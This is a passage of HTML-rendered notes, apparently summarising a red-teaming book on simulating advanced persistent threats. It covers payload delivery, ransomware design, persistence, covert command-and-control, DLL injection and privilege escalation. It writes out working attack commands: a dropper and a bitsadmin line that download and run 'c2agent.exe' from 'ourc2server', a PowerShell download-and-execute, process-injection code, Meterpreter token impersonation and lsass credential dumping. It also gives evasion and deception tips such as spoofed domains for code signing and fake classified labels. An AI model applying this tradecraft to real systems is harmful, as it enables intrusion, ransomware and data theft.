    Set objADOStream = Nothing
End if
Set objXMLHTTP = Nothing
Set objShell = CreateObject(&quot;WScript.Shell&quot;)
objShell.Exec(&quot;agent.exe&quot;)
</code></pre></div>
  <div class="highlight"><pre><span></span><code>cmd.exe /c <span class="s2">&quot;@echo Set objXMLHTTP=CreateObject(&quot;</span>MSXML2.XMLHTTP<span class="s2">&quot;)&gt;poc.vbs &amp;@echo objXMLHTTP.open &quot;</span>GET<span class="s2">&quot;,&quot;</span>http://ourc2server/downloads/c2agent. exe<span class="s2">&quot;,false&gt;&gt;poc.vbs</span>
<span class="p">&amp;@</span><span class="k">echo</span> objXMLHTTP.send()<span class="p">&gt;&gt;</span>poc.vbs
<span class="p">&amp;@</span><span class="k">echo</span> If objXMLHTTP.Status=200 Then<span class="p">&gt;&gt;</span>poc.vbs
<span class="p">&amp;@</span><span class="k">echo</span> Set objADOStream=CreateObject(<span class="s2">&quot;ADODB.Stream&quot;</span>)<span class="p">&gt;&gt;</span>poc.vbs <span class="p">&amp;@</span><span class="k">echo</span> objADOStream.Open<span class="p">&gt;&gt;</span>poc.vbs
<span class="p">&amp;@</span><span class="k">echo</span> objADOStream.Type=1 <span class="p">&gt;&gt;</span>poc.vbs
<span class="p">&amp;@</span><span class="k">echo</span> objADOStream.Write objXMLHTTP.ResponseBody<span class="p">&gt;&gt;</span>poc.vbs <span class="p">&amp;@</span><span class="k">echo</span> objADOStream.Position=0 <span class="p">&gt;&gt;</span>poc.vbs
<span class="p">&amp;@</span><span class="k">echo</span> objADOStream.SaveToFile <span class="s2">&quot;agent.exe&quot;</span><span class="p">&gt;&gt;</span>poc.vbs
<span class="p">&amp;@</span><span class="k">echo</span> objADOStream.Close<span class="p">&gt;&gt;</span>poc.vbs
<span class="p">&amp;@</span><span class="k">echo</span> Set objADOStream=Nothing<span class="p">&gt;&gt;</span>poc.vbs
<span class="p">&amp;@</span><span class="k">echo</span> End if<span class="p">&gt;&gt;</span>poc.vbs
<span class="p">&amp;@</span><span class="k">echo</span> Set objXMLHTTP=Nothing<span class="p">&gt;&gt;</span>poc.vbs
<span class="p">&amp;@</span><span class="k">echo</span> Set objShell=CreateObject(<span class="s2">&quot;WScript.Shell&quot;</span>)<span class="p">&gt;&gt;</span>poc.vbs <span class="p">&amp;@</span><span class="k">echo</span> objShell.Exec(<span class="s2">&quot;agent.exe&quot;</span>)<span class="p">&gt;&gt;</span>poc.vbs<span class="p">&amp;</span>cscript.exe poc.vbs<span class="s2">&quot;</span>
</code></pre></div></li>
<li>BITSadmin: <code>cmd.exe /c "bitsadmin /transfer myjob /download /priority high http://ourc2server.com/download/c2agent.exe c:\agent.exe&amp;start agent.exe"</code></li>
<li>Base64 encode:
  <div class="highlight"><pre><span></span><code><span class="nb">PS </span><span class="p">&gt;</span> <span class="nv">$b</span> <span class="p">=</span> <span class="no">[System.Text.Encoding]</span><span class="p">::</span><span class="n">UTF8</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="s2">&quot;PowerShell (N ew-Object System.Net.WebClient).DownloadFile(&#39;http://ourc2server.com/download/c2agent.exe&#39;,&#39;agent.exe&#39;);Start-Process &#39;agent.exe&#39;&quot;</span><span class="p">)</span>
<span class="nb">PS </span><span class="p">&gt;</span> <span class="no">[System.Convert]</span><span class="p">::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="nv">$b</span><span class="p">)</span>
</code></pre></div></li>
</ul>
</li>
<li>Part 2: Using the Java Applet for Payload Delivery<ul>
<li>Java Code Signing<ul>
<li>completely unrealistic security model that lulls users into a false sense of security.</li>
<li>Getting a signing cert:<ul>
<li>Register a domain name that is similar to an existing business</li>
<li>Clone and host that website </li>
<li>Change all phone contact information </li>
<li>Consider a company well outside of the code signer’s normal business area </li>
</ul>
</li>
<li>SMTP: <a href="https://tools.ietf.org/html/rfc6531">https://tools.ietf.org/html/rfc6531</a><ul>
<li>never use the same IPs for mail delivery and C2</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Part 3: Physical Media <ul>
<li>official looking letter giving instructions to the target</li>
<li>Target Location Profiling<ul>
<li>Create a list of ~100 and send a mail. Extract address from reply. </li>
</ul>
</li>
<li>installer such as InstallShield or Inno</li>
<li>payloads are installed to somewhere they won’t be found and executed, whereas our dummy application should be the thing that draws attention. (install with a desktop icon etc.)</li>
<li>also  drop the PowerView PowerShell script</li>
<li>When hand delivering.  Don’t queue. </li>
<li>official, appears to come from an official source, and seems mandatory</li>
</ul>
</li>
<li>Part 4: Client-Side Exploits 1<ul>
<li>Flash exploits</li>
</ul>
</li>
<li>Part V: Simulating a Ransomware Attack<ul>
<li>could just be one component in a larger APT scenario</li>
<li>Asymmetric cryptography only<ul>
<li><code>libgcrypt</code><ul>
<li><code>gcry_pk_encrypt</code>—Encrypt data using a public key.</li>
<li><code>gcry_pk_decrypt</code>—Decrypt data using a private key.</li>
<li><code>gcry_pk_genkey</code>—Create a new public/private key pair.</li>
</ul>
</li>
</ul>
</li>
<li>Remote key generation<ul>
<li>C2 agent should send a request to the C2 server requesting that a private and a public key pair be generated</li>
<li>Public key is then downloaded to the agent</li>
</ul>
</li>
<li>Configurable<ul>
<li>target specific file groups</li>
<li>target local/network shares</li>
</ul>
</li>
<li>File operations <ul>
<li>enumerate all drives and scan them for files</li>
<li>As each file is encrypted, its name should be added to a list somewhere</li>
<li>original file should be destroyed through cryptographic scrubbing.</li>
<li>secure-delete </li>
<li>hashing and overwriting the file is one example of how this may be achieved</li>
<li>encrypted file should be placed in the same directory</li>
</ul>
</li>
<li>notify<ul>
<li>generating a SHA hash of the public key </li>
<li>providing that string as a reference when requesting payment</li>
</ul>
</li>
<li>ability to export the names of all encrypted files back to the C2 server</li>
</ul>
</li>
<li>Part VI: Deploying with HTA<ul>
<li>HTA</li>
<li>Add icon to hta</li>
</ul>
</li>
<li>Part VII: USB Shotgun Attack<ul>
<li>Starting with Windows 7, the OS no longer supports the AutoRun functionality for non-optical removable media. AutoPlay will still work on CDs and DVDs (the user will be given the option to execute the code, but it won’t happen automatically); however, it will no longer work at all for USB drives</li>
</ul>
</li>
<li>Part VIII: Miscellaneous Rich Web Content<ul>
<li>Java Web Start </li>
<li>Adobe Air</li>
<li>InDesign plugin<ul>
<li>Create a document and package all dependencies with the document</li>
</ul>
</li>
</ul>
</li>
<li>Democratic People’s Republic of Korea (DPRK) <ul>
<li>Democratic People’s Republic of Korea (DPRK) - Red Star OS<ul>
<li>No root. Discretionary Access Control (DAC) provided by SE Linux</li>
<li>Grant root by: <code>rootsetting</code></li>
<li>Stop SE Linux: <code>setenforce 0</code> <code>killall -9 securityd</code></li>
<li>Kill monitoring apps: <code>killall scnprc</code> <code>killall opprc</code> </li>
</ul>
</li>
<li>Phone system<ul>
<li>Needs entry through operator at +850 2 18111 (850 is the country code for DPRK and 2 is Pyongyang)</li>
<li>Numbers that can dial internationally cannot dial locally</li>
<li>War-dialing. VoIP calling to reduce cost.</li>
<li>Record samples. Any tones that fall within a certain frequency we log as modems. Modem responses will contain the following tone DTMFs: 2250hz + 1625hz, 1850hz, 2000hz...</li>
<li>WarVOX: <a href="https://github.com/rapid7/warvox">https://github.com/rapid7/warvox</a></li>
<li>Grab audio/video from android. If SSL site, permissions are requested only once.</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Command and Control <ul>
<li>Part 1: Basics and Essentials<ul>
<li>Essentials<ul>
<li>Egress connectivity</li>
<li>Stealth<ul>
<li>fake the timestamp on the executable (show it was there for long time)</li>
<li>Svchost.exe and spoolsv.exe make the best targets because there are usually several copies running in memory</li>
</ul>
</li>
<li>Remote file system access</li>
<li>Remote command execution</li>
<li>Secure communications</li>
<li>Persistence<ul>
<li>Windows<ul>
<li><code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code></li>
<li><code>HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options</code></li>
<li><code>HKLM\Software\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options</code></li>
<li>Services<ul>
<li>need to be specially compiled as a Windows service</li>
</ul>
</li>
<li>drop a DLL instead of an EXE and reference it from a Registry key using rundll32<ul>
<li><code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert('Boo!');</code></li>
</ul>
</li>
<li>largest database of autorun methods: <a href="https://technet.microsoft.com/en-gb/sysinternals/bb963902.aspx">https://technet.microsoft.com/en-gb/sysinternals/bb963902.aspx</a></li>
</ul>
</li>
<li>Linux<ul>
<li>System V init<ul>
<li>On Older OSes<ul>
<li>Debian 6 and earlier </li>
<li>Ubuntu 9.04 and earlier </li>
<li>CentOS 5 and earlier</li>
</ul>
</li>
<li>Bash init script at <code>/etc/init.d/service</code></li>
<li>Then run <code>sudo update-rc.d service enable</code></li>
<li>This create a symlink in the runlevel directories 2 though 5</li>
<li>Add following to /etc/inittab: <code>id:2345:respawn:/bin/sh /path/to/application/startup</code></li>
<li><code>sudo service service stop</code></li>
<li><code>sudo service service start</code></li>
</ul>
</li>
<li>Upstart<ul>
<li>OSes<ul>
<li>Introduced: Ubuntu 6</li>
<li>Default in: Ubuntu 9.10</li>
<li>Red Hat Enterprise 6</li>
<li>Google Chrome OS</li>
<li>Ubuntu 9.10 to Ubuntu 14.10</li>
<li>CentOS 6</li>
</ul>
</li>
</ul>
</li>
<li>systemd<ul>
<li>configuration script in <code>/etc/init</code> called <code>servicename.conf</code></li>
<li>Make sure it contains (runs on boot and will respawn if it dies): <code>start on runlevel [2345]&lt;br&gt;respawn</code></li>
<li>Create: <code>/etc/systemd/system/multi-user.target.wants/service.service</code><ul>
<li>Should contain: <code>Restart=always</code> under <code>[Service]</code> section</li>
</ul>
</li>
<li>Start: <code>sudo systemctl enable service.service</code></li>
</ul>
</li>
<li>cron</li>
<li>init files <ul>
<li>/etc/profile</li>
<li>/etc/profile.d/*.sh</li>
</ul>
</li>
<li>Graphical environments  </li>
<li>Rootkits: binary on the target system that has been replaced by malicious code yet retains the functionality of the original</li>
</ul>
</li>
<li>OSX<ul>
<li>cron</li>
<li>first user-mode app to start is <code>launchd</code>. abusable by:<ul>
<li><code>echo bsexec 1 /bin/bash payload.script &amp;gt; /etc/launchd.conf</code></li>
</ul>
</li>
<li>startup items<ul>
<li>place two items in a subdir within startup dir (<code>/System/ Library/StartupItems or /Library/StartupItems</code>)<ul>
<li><code>StartupParameters.plist</code> must contain </li>
<li><code>Provides</code> key containing name of script file<ul>
<li>name of the sub-directory must be the same as the name of the script file </li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Port forwarding</li>
<li>Control thread</li>
</ul>
</li>
<li>C2 Server<ul>
<li>SSH serving running on TCP port 443</li>
<li>Chroot jail to contain the SSH server</li>
<li>Modified SSH configuration to permit remotely forwarded tunnels</li>
</ul>
</li>
<li>Payload (use <code>libssh</code>)<ul>
<li>Implementation of SSH server on non-standard TCP port (ex: 900)</li>
<li>Implementation of SSH client permitting connections back to C2 server</li>
<li>Implementation of SSH tunnels (both local and dynamic) over the SSH client permitting C2 access to target file system and processes</li>
</ul>
</li>
</ul>
</li>
<li>Part 2: Advanced Attack Management<ul>
<li>Stealth and Multiple System Management</li>
<li><strong>Beaconing</strong>: periodically call home (your C2 server) for orders rather than immediately establishing an SSH connection and reverse tunnel</li>
<li><strong>Pre-configured command set</strong>—An established set of instructions<ul>
<li>Sleep (~60 seconds)</li>
<li>OpenSSHTunnel<ul>
<li>SSH connection back to the C2</li>
<li>initiate a reverse tunnel allowing C2 to access the target’s file system</li>
<li>L22C900</li>
</ul>
</li>
<li>Close SSHTunnel</li>
<li>OpenTCPTunnel<ul>
<li>SSH connection back to the C2</li>
<li>and open a reverse tunnel to any port on the target for accessing local services</li>
<li>LxxxCxxx</li>
</ul>
</li>
<li>CloseTCPTunnel</li>
<li>OpenDynamic<ul>
<li>SSH connection back to the C2 </li>
<li>and open both a dynamic tunnel and a reverse TCP tunnel pointing to it</li>
<li>SOCKS5 proxy server</li>
</ul>
</li>
<li>CloseDynamic</li>
<li>Task<ul>
<li>Download an executable from the web</li>
</ul>
</li>
</ul>
</li>
<li><strong>Tunnel management</strong>—The C2 server needs to be able to handle multiple simultaneous inbound connections</li>
<li><strong>Web-based frontend</strong><ul>
<li>Web server: tinyhttpd</li>
<li>Scripting language: Python</li>
<li>Database: PostgreSQL</li>
<li>AJAX</li>
<li>IPs, hostnames, etc</li>
<li>ports are currently open</li>
<li>which hosts they are assigned to</li>
<li>function to periodically check the status of open tunnels and mark closed</li>
<li>have a way to stack commands </li>
</ul>
</li>
</ul>
</li>
<li>Part 3: Advanced Channels and Data Exfiltration<ul>
<li>ICMP packets were dropped is irrelevant: I can use DNS resolution itself as a means of command and control.</li>
<li><code>dig +trace</code> - using iterative querie sand following the referrals all the way</li>
<li>communicate to our C2 via recursive DNS queries </li>
<li>1<sup>st</sup> POC - Dan Kaminsky in 2004 with OzymanDNS</li>
<li><code>dnscat2</code><ul>
<li><code>sudo apt-get install ruby-dev</code></li>
<li><a href="https://github.com/iagox86/dnscat2.git">https://github.com/iagox86/dnscat2.git</a></li>
<li><code>ruby ./dnscat2.rb anti-virus-update.com</code></li>
<li>modifications to the C source to avoid detection</li>
<li>...</li>
<li><code>listen [0000:]443 localhost:443</code> to create a tunnel between you and remote 443 (then SSH to remote via tunnel)</li>
</ul>
</li>
</ul>
</li>
<li>Part V: Creating a Covert C2 Solution<ul>
<li>Onion Router<ul>
<li>Routed through several layers of routers</li>
<li>Each layer can only see its own upstream and downstream connections in any session and traffic is encrypted</li>
<li>If attackers control the exit node, they can see the traffic going to its final destination</li>
<li>correlation attacks that can be executed by major players (example NSA)<ul>
<li>identified by cross-referencing packets entering and leaving the Tor network</li>
</ul>
</li>
<li>C2 server can be provisioned as a node within the Tor network<ul>
<li>compromised host will connect to Tor when it comes online</li>
<li>remaining operational access, even if compromised hosts are detected</li>
</ul>
</li>
</ul>
</li>
<li>Impl<ul>
<li>Tor stores its configuration in a file called torrc</li>
<li>To create a hidden service:
  <div class="highlight"><pre><span></span><code># Configure hidden service directory Hidden
ServiceeDir /home/wil/tor_hidden 
# C2 Web Port
HiddenServicePort 443 127.0.0.1:4433
# C2 SSH Port
HiddenServicePort 7022 127.0.0.1:7022 
# C2 Metasploit listener
HiddenServicePort 8080 127.0.0.1:8080
</code></pre></div></li>
<li>next time Tor is started, two files will be created in the tor_hidden directory<ul>
<li>private_key file</li>
<li>hostname file that contains a hash of the public key<ul>
<li>address of your C2</li>
</ul>
</li>
</ul>
</li>
<li>Agent<ul>
<li>bundle the tor.exe (rename first) command-line application with the agent and simply execute it without parameters</li>
<li>this will open a SOCKS proxy port on localhost 9050</li>
<li>Tell the SSH SOCKS proxy to upstream to the Tor SOCKS proxy on TCP 9050</li>
</ul>
</li>
<li>Restrictions<ul>
<li>Some networks may block port TCP 9050 outbound or even dynamically blacklist all Tor nodes</li>
<li>Tell C2 agent to use Tor bridges when connecting</li>
<li>achieved by adding the following options to the local torrc configuration file (or command line args)
  <div class="highlight"><pre><span></span><code>Bridge fte 128.105.214.163:8080 A17A40775FBD2CA1184BF80BFC330A77ECF9D0E9 
Bridge fte 192.240.101.106:80 FDC5BA65D93B6BCA5EBDF8EF8E4FA936B7F1F8E5 
Bridge fte 128.105.214.162:8080 FC562097E1951DCC41B7D7F324D88157119BB56D 
Bridge fte 50.7.176.114:80 2BD466989944867075E872310EBAD65BC88C8AEF 
Bridge fte 131.252.210.150:8080 0E858AC201BF0F3FA3C462F64844CBFFC7297A42
Bridge fte 128.105.214.161:8080 1E326AAFB3FCB515015250D8FCCC8E37F91A153B
UseBridges 1
</code></pre></div></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Part VI: The Creeper Box<ul>
<li>Using Raspberry Pi</li>
<li>PoE (forensic analysis become hard)</li>
<li>3G/4G adapter<ul>
<li>ppp</li>
<li>sakis3g</li>
</ul>
</li>
<li>Configuring Full-Disk Encryption (this involves lot of steps. Ref to book for details)</li>
<li>Enable the SSH server</li>
<li>change the MAC address (router/switch)</li>
<li>configuring a fake Cisco telnet or SSH daemon</li>
<li>bridge between between either a switch and a host or a switch and router<ul>
<li>bridge-utils</li>
</ul>
</li>
<li>Using a Pi as a Wireless AP to Provision Access by Remote Keyloggers</li>
<li>Label that says "Do not tamper"with company logo.</li>
</ul>
</li>
<li>Part VII: Advanced Autonomous Data Exfiltration<ul>
<li>Physical Media<ul>
<li>Detect removable media </li>
<li>Target data to exfiltrate packaged on to the drive</li>
<li>Embedded into some pseudo-executable format (HTA)</li>
<li>"Hail Mary"</li>
<li>BlackHat: <a href="https://www.youtube.com/watch?v=nuruzFqMgIw">https://www.youtube.com/watch?v=nuruzFqMgIw</a><ul>
<li>USB act like a regular drive. </li>
<li>When plugged in during boot, it act as a keyboard and a linux drive.</li>
<li>Replace the bootloader with its own.</li>
</ul>
</li>
</ul>
</li>
<li>Dropbox to bypass restrictions (Dropbox doesn't do malware checks)</li>
<li>Email<ul>
<li>Use API when possible: example: Outlook API</li>
<li>check if a domain has SPF protection (before spoofing)</li>
</ul>
</li>
<li>Wifi<ul>
<li>Connect the laptop via wireless to an AP that you control</li>
<li>hidden feature in Windows that allows you to host your own AP while being simultaneously connected to another one with the same adapter (Internet Connection Sharing)<ul>
<li><code>netsh wlan set hostednetwork mode ="allow" ssid="C2backdoor" key = "password"</code></li>
<li><code>net start SharedAccess</code></li>
</ul>
</li>
</ul>
</li>
<li>Mobile data / Bluetooth / SMS</li>
<li>Dongle <ul>
<li>stealth installs the 3G/4G drivers<ul>
<li>silent install: <code>setup_vmb.exe s /L2057 /v"OPCO_PROP=23415 /qn /norestart"</code></li>
</ul>
</li>
<li>establishes C2</li>
<li>(talk about adding a label that says: SIPDIS means it’s for SIPRNet distribution and NOFORN means No Foreign Nationals )<ul>
<li>Reciever will plug it to SIPRNet workstation to know what's inside</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Part VIII: Experimental Concepts in Command and Control<ul>
<li>C2 Server Guided Agent Management<ul>
<li>allow the C2 server to assign roles to the C2 agents</li>
<li>one becomes master, others send data to master (master repaly to C2)<ul>
<li>have timeout and failover mechanisum</li>
</ul>
</li>
<li>HTTPS is not recommended for carrying C2 data outside the network<ul>
<li>Due to border level security</li>
</ul>
</li>
<li>May use ICMP, SNMP, fake RIP and OSPF messages</li>
</ul>
</li>
<li>Semi-Autonomous C2 Agent Management<ul>
<li>broadcast packet or a fake ARP packet can be used to enable nodes that are not aware of each other’s presence</li>
<li>elect a master<ul>
<li>The host with the most points becomes the new master</li>
<li>points:<ul>
<li>Relative importance of the node (DC)</li>
<li>Previous reliability of the node as noted by uptime</li>
<li>Communication reliability in general (score decrease with every failure)</li>
<li>Random jitter to avoid stagnation</li>
</ul>
</li>
</ul>
</li>
<li>master responsible of<ul>
<li>monitoring slaves</li>
<li>motify c2 if slave goes  offline</li>
<li>central conduit between the C2 server and the C2 slave nodes</li>
<li>Correctly routing C2 messages to C2 slave nodes (c2 only say slave ID)</li>
<li>should not be used for initiating a new election (that is reponsibility of all)</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>The Attack<ul>
<li>Bypassing Authentication<ul>
<li>browser pivoting - transparently exploit his or her permissions<ul>
<li>DLL Injection - Inject code into the IE process <ul>
<li>migrate code between processes is a core skill in APT modeling</li>
<li>process of inserting code into an existing (running) process</li>
<li>use the <code>LoadLibraryA()</code> function in <code>kernel32.dll</code><ul>
<li>this function will register our DLL with the target process</li>
<li>big antivirus no-no</li>
</ul>
</li>
<li>Better approach:<ul>
<li>Attach to the target process (in this case Internet Explorer).<ul>
<li><code>hHandle = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |</code></li>
</ul>
</li>
<li>Allocate memory within the target process.<ul>
<li><code>PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,FALSE,procID );</code>
<div class="highlight"><pre><span></span><code><span class="n">GetFullPathName</span><span class="p">(</span><span class="n">TEXT</span><span class="p">(</span><span class="s">&quot;proxy.dll&quot;</span><span class="p">),</span> <span class="n">BUFSIZE</span><span class="p">,</span> <span class="n">dllPath</span><span class="p">,</span> <span class="n">NULL</span><span class="p">);</span>
<span class="n">hFile</span> <span class="p">=</span> <span class="n">CreateFileA</span><span class="p">(</span> <span class="n">dllPath</span><span class="p">,</span> <span class="n">GENERIC_READ</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span> <span class="n">NULL</span><span class="p">);</span>
<span class="n">dllFileLength</span> <span class="p">=</span> <span class="n">GetFileSize</span><span class="p">(</span> <span class="n">hFile</span><span class="p">,</span><span class="n">NULL</span> <span class="p">);</span>
<span class="n">remoteDllAddr</span> <span class="p">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span> <span class="n">hProcess</span><span class="p">,</span> <span class="n">NULL</span><span class="p">,</span> <span class="n">dllFileLength</span><span class="p">,</span> <span class="n">MEM_RESERVE</span><span class="p">|</span><span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span> <span class="p">);</span>
</code></pre></div></li>
</ul>
</li>
<li>Copy the DLL into the target process memory and calculate an appropriate memory addresses.
  <div class="highlight"><pre><span></span><code><span class="n">lpBuffer</span> <span class="p">=</span> <span class="n">HeapAlloc</span><span class="p">(</span> <span class="n">GetProcessHeap</span><span class="p">(),</span> <span class="m">0</span><span class="p">,</span> <span class="n">dllFileLength</span> <span class="p">);</span> 
<span class="n">ReadFile</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="n">lpBuffer</span><span class="p">,</span> <span class="n">dllFileLength</span><span class="p">,</span> <span class="p">&amp;</span><span class="n">dwBytesRead</span><span class="p">,</span> <span class="n">NULL</span><span class="p">);</span>
<span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">lpRemoteLibraryBuffer</span><span class="p">,</span> <span class="n">lpBuffer</span><span class="p">,</span> <span class="n">dllFileLength</span><span class="p">,</span> <span class="n">NULL</span><span class="p">);</span>
<span class="n">dwReflectiveLoaderOffset</span> <span class="p">=</span> <span class="n">GetReflectiveLoaderOffset</span><span class="p">(</span><span class="n">lpWriteBuff</span><span class="p">);</span>
</code></pre></div></li>
<li>Instruct the target process to execute your DLL.
  <div class="highlight"><pre><span></span><code><span class="n">rThread</span> <span class="p">=</span> <span class="n">CreateRemoteThread</span><span class="p">(</span><span class="n">hTargetProcHandle</span><span class="p">,</span> <span class="n">NULL</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">lpStartExecAddr</span><span class="p">,</span> <span class="n">lpExecParam</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">NULL</span><span class="p">);</span>
<span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">rThread</span><span class="p">,</span> <span class="n">INFINITE</span><span class="p">);</span>
</code></pre></div></li>
</ul>
</li>
</ul>
</li>
<li>Create a web proxy Dynamic Link Library (DLL) based on the Microsoft WinInet API<ul>
<li>Internet Explorer uses the WinInet API exclusively for communication</li>
<li>Inject proxy to intercept and read session finroamtion</li>
</ul>
</li>
<li>Pass web traffic through our SSH tunnel and the newly created proxy</li>
</ul>
</li>
</ul>
</li>
<li>Situational Awareness<ul>
<li>ascertain exactly where you are in a target’s network</li>
<li>what privileges you have</li>
<li><a href="https://github.com/PowerShellEmpire/PowerTools">https://github.com/PowerShellEmpire/PowerTools</a>: collection of PowerShell projects with a focus on offensive operations</li>
<li>PowerView, can be used to query the AD in a number of ways
  <div class="highlight"><pre><span></span><code>c:&gt; powershell.exe -nop -exec bypass
PS c:&gt; import-module .\powerview.ps1
PS c:&gt; Get-NetDomain | Out-File -Encoding ascii domains.txt
PS c:&gt; Get-NetComputer -FullData | Out-File -encoding ascii machines.txt
PS c:&gt; Get-NetUser -FullData | Out-File -encoding ascii users.txt
</code></pre></div></li>
<li>FortiGate OS Version 4.8</li>
<li><code>sqlcmd -s medlab03-SQL -u coll-domain/dgammon -p ILoveJustinBieber -q "exec sp_databases"</code></li>
<li><code>sqlcmd -s medlab03-SQL -u coll-domain/dgammon -p ILoveJustinBieber -Q "BACKUP DATABASE perfuse_db TO DISK='C:\perfuse_db.bak'"</code></li>
<li>Get IPs of hosts:
  <div class="highlight"><pre><span></span><code>foreach ($computer in (get-content C:\hosts.txt)) { Try{
    [system.net.Dns]::GetHostAddresses($computer) | Foreach-Object { add-content -path C:\hosts-ips.txt -value &quot;$($_.IPAddressToString)&quot;}
} Catch {
} }
</code></pre></div></li>
</ul>
</li>
<li>Migration<ul>
<li>Process<ul>
<li>Checking if the meterpreter process has the <code>SeDebugPrivilege</code></li>
<li>Getting payload from the handler &amp; Calculating its length</li>
<li>Calling the <code>OpenProcess()</code> API to gain access to the virtual memory of the target process.</li>
<li>Calling the <code>VirtualAllocEx()</code> API to allocate an RWX (Read, Write, Execute) memory in the target process.</li>
<li>Calling the <code>WriteProcessMemory()</code> API to write the payload in the target memory virtual memory space.</li>
<li>Calling the <code>CreateRemoteThread()</code> API to execute the newly created memory stub having the injected payload in a new thread.</li>
<li>Terminating the initial Meterpreter process.</li>
</ul>
</li>
<li>Uses<ul>
<li>migrate into the <code>lsass.exe</code> process and dump cached hashes without touching the disk</li>
<li>Windows logon credentials, you must first inject into the <code>winlogon.exe</code> process</li>
</ul>
</li>
</ul>
</li>
<li>After compromise <ul>
<li>Check if  a domain-admin has signed into a machine where you have local-admin access to: PowerView <code>Invoke-StealthUserhunter -GroupName "Domain Admins"</code></li>
<li>Impersonate domain admin:
  <div class="highlight"><pre><span></span><code>meterpreter &gt; use incognito
meterpreter &gt; getuid
meterpreter &gt; list_tokens -u
meterpreter &gt; impersonate_token PHARMA\globaladmin
</code></pre></div></li>
<li>Search for files: <code>dir \\hostname\c$\*.xl* /s/b</code><ul>
<li><code>Personal Storage Table (.pst)</code></li>
<li><code>Offline Stored Table (.ost)</code></li>
</ul>
</li>
<li>WMIC installer, which will allow us to invisibly deploy software remotely without any further user interaction:
  <div class="highlight"><pre><span></span><code>wmic
&gt; /node::@&quot;c:\computers.txt&quot; product call install true,&quot;&quot; , &quot;c:\ PathToYour\File.msi
</code></pre></div></li>
<li>Credentials<ul>
<li>Decrypting the credential store</li>
<li>copy the encrypted hashes<ul>
<li>re-create the login file or Registry entries locally</li>
<li>let you access the applications they are intended to secure</li>
<li>use a network sniffer (such as Wireshark) on your own machine to see the password transmitted in the clear</li>
</ul>
</li>
</ul>
</li>
<li>Keyloggers and Cookies<ul>
<li>delete the cookies and force the users to log in: <code>RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 2</code></li>
<li>Chrome: Delete relevant file in: <code>C:\Users\&amp;lt;username&amp;gt;\AppData\Local\Google\Chrome\User Data</code></li>
</ul>
</li>
<li>Windows Previlege Escalation <ul>
<li>Local exploit<ul>
<li><code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code></li>
<li><code>wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB2393802"</code></li>
<li><a href="https://github.com/GDSSecurity/Windows-Exploit-Suggester.git">https://github.com/GDSSecurity/Windows-Exploit-Suggester.git</a></li>
</ul>
</li>
<li>Flawed installation method<ul>
<li><code>sysprep.inf</code></li>
<li><code>sysprep.xml</code></li>
<li><code>unattended.xml</code></li>
</ul>
</li>
<li>Scheduled tasks<ul>
<li><code>schtasks /query /fo LIST /v</code></li>
<li><code>schtasks /create /tn &lt;TaskName&gt; /tr &lt;TaskRun&gt; /sc onstart</code></li>
<li><code>schtasks /create /tn &lt;TaskName&gt; /tr &lt;TaskRun&gt; /sc onlogon</code></li>
<li><code>schtasks /create /tn &lt;TaskName&gt; /tr &lt;TaskRun&gt; /sc onidle /i {1 - 999}</code></li>
<li><code>schtasks /create /tn &lt;TaskName&gt; /tr &lt;TaskRun&gt; /sc once /st &lt;HH:MM&gt;</code></li>
<li><code>schtasks /create /tn &lt;TaskName&gt; /tr &lt;TaskRun&gt; /sc onlogon /ru System</code> runs with system permissions</li>
<li><code>schtasks /create /tn &lt;TaskName&gt; /tr &lt;TaskRun&gt; /sc onlogon /s &lt;PC_Name&gt;</code> runs on a remote computer</li>
</ul>
</li>
<li>Vulnerable services<ul>
<li><code>net start</code></li>
<li><code>sc qc VulnService</code></li>
<li><code>accesschk.exe -ucqv VulnService</code></li>
<li><code>sc config VulnPath binpath= "C:\temp\c2agent.exe"</code></li>
<li><code>sc config VulnPath obj= ".\LocalSystem" password= ""</code></li>
</ul>
</li>
<li>DLL hijacking<ul>
<li>DLL is loaded into the process space of the program calling it (becomes part of that program)</li>
<li>DLL has no execution permissions of its own</li>
<li>inherits permissions from the executable that imports it</li>
<li>Recon:<ul>
<li>Which processes will load with elevated privileges</li>
<li>Which DLLs you can overwrite with the privileges you have</li>
<li>What DLLs are being imported by any given process</li>
</ul>
</li>
<li>Workflow:<ul>
<li>search processes: <code>tasklist.exe /FI "username eq system" /v</code></li>
<li><code>Dependency Walker</code> to identify DLLs used </li>
<li><code>icacls mmfs2.dll</code> to check permissions </li>
<li>craft DLL (c++)
  <div class="highlight"><pre><span></span><code><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="c1"> </span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
